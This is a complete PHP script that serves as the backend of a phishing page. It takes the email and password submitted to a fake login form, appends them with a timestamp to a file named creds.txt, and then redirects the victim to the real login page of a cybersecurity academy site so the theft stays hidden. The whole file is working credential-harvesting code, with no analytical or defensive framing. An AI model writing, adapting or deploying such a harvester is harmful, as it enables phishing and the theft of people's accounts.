<?php

$file = 'creds.txt';


$email = $_POST['email'];
$pass = $_POST['password'];


$time = date('Y-m-d H:i:s');
$content = "[$time] Email: " . $email . " | Pass: " . $pass . "\n";


file_put_contents($file, $content, FILE_APPEND);

header("Location: https://academy.cyberiumarena.com/login/");
exit();
?>
